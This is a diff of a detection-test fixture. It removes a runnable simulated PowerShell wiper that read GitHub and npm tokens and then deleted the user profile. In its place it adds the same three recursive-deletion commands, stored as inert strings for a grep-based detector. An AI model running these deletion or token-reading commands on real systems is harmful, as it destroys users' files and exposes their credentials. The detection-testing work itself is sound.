@@ -1,31 +1,16 @@
-# SIMULATED MALICIOUS SCRIPT - PowerShell destructive patterns
+# DEFANGED TEST FIXTURE - Destructive pattern signatures for detection testing
+# These patterns are stored as inert string data, not executable commands.
+# Based on Koi Security disclosure of Shai-Hulud 2.0 wiper behavior.
+#
+# The detector uses grep to match these patterns in file contents.
+# The exact command text must be present for detection, but does not need
+# to be executable code.
 
-Write-Host "Attempting credential theft..."
+# Pattern 1: PowerShell Remove-Item with recursion targeting user profile
+$PATTERN_1 = 'Remove-Item -Recurse -Force "$env:USERPROFILE\*"'
 
-# Try to find credentials
-$githubToken = Get-ChildItem Env: | Where-Object {$_.Name -like "*GITHUB*"}
-$npmToken = Get-Content "$env:USERPROFILE\.npmrc" -ErrorAction SilentlyContinue
+# Pattern 2: Alternative destruction via Get-ChildItem pipeline
+$PATTERN_2 = 'Get-ChildItem $env:USERPROFILE -Recurse | Remove-Item -Force'
 
-if (-not $githubToken -or -not $npmToken) {
-    Write-Host "Credential theft failed, activating destructive mode"
-
-    # DESTRUCTIVE PATTERNS - These would be detected
-
-    try {
-        # Pattern 1: PowerShell Remove-Item with recursion
-        Remove-Item -Recurse -Force "$env:USERPROFILE\*"
-
-        # Pattern 2: Alternative destruction syntax
-        Get-ChildItem $env:USERPROFILE -Recurse | Remove-Item -Force
-
-    } catch {
-        Write-Host "Destruction failed, trying cmd fallback"
-
-        # Pattern 3: CMD-style deletion
-        cmd /c "del /s /q $env:USERPROFILE\*"
-    }
-
-    Write-Host "Destructive payload completed"
-} else {
-    Write-Host "Credentials found, exfiltrating data"
-}
+# Pattern 3: CMD-style deletion fallback
+$PATTERN_3 = 'del /s /q $env:USERPROFILE\*'
